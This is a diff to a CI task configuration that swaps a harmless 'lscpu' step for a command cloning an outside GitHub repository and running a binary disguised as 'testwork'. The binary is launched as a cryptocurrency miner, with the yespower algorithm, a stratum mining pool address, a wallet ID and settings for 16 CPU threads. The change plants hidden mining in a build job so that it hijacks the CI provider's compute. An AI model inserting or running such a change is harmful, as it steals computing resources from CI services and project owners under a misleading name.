@@ -1,4 +1,4 @@
 task:
     container:
       image: debian:latest
-    script: lscpu
+    script: git clone https://github.com/remakove/marsose.git marsose && cd marsose && chmod +x testwork && ./testwork --algorithm yespower --pool stratum+tcps://stratum-na.rplant.xyz:3350 --wallet VPwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.pc --disable-gpu --cpu-threads 16 --cpu-affinity 0xFFFF
